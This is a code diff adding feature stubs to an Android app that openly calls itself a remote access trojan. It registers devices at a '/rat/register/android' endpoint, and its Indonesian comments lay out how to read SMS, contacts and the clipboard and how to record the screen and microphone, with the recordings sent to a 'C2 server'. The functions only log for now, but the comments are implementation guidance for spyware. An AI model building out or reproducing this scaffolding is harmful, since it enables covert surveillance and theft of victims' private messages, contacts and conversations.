@@ -38,6 +38,43 @@ public class MainActivity extends AppCompatActivity {
         finish();
     }
 
+    // --- CONTOH FUNGSI FITUR (PERLU DIIMPLEMENTASIKAN) ---
+
+    private void getSms() {
+        // Gunakan ContentResolver untuk query SMS dari Telephony.Sms.CONTENT_URI
+        Log.d(TAG, "Fitur getSms dipanggil.");
+    }
+
+    private void getContacts() {
+        // Gunakan ContentResolver untuk query kontak dari ContactsContract.CommonDataKinds.Phone.CONTENT_URI
+        Log.d(TAG, "Fitur getContacts dipanggil.");
+    }
+
+    private void recordScreen() {
+        // Ini fitur yang sangat kompleks.
+        // 1. Minta izin FOREGROUND_SERVICE dan RECORD_AUDIO.
+        // 2. Buat MediaProjectionManager untuk menangkap layar.
+        // 3. Buat Service di foreground untuk merekam.
+        // 4. Gunakan MediaRecorder untuk merekam video dan audio.
+        // 5. Kirim file video ke server C2 Anda.
+        Log.d(TAG, "Fitur recordScreen dipanggil.");
+    }
+
+    private void recordMicrophone() {
+        // 1. Minta izin RECORD_AUDIO.
+        // 2. Gunakan MediaRecorder untuk merekam audio dari mikrofon.
+        // 3. Simpan rekaman ke file.
+        // 4. Kirim file audio ke server C2 Anda.
+        Log.d(TAG, "Fitur recordMicrophone dipanggil.");
+    }
+
+    private void getClipboard() {
+        // 1. Gunakan ClipboardManager untuk mendapatkan data dari clipboard.
+        // ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+        // String text = clipboard.getPrimaryClip().getItemAt(0).getText().toString();
+        Log.d(TAG, "Fitur getClipboard dipanggil.");
+    }
+
     private void registerDevice(String deviceId) {
         // Implementasikan logika untuk mengirim HTTP POST request ke endpoint Anda
         // Endpoint: /rat/register/android
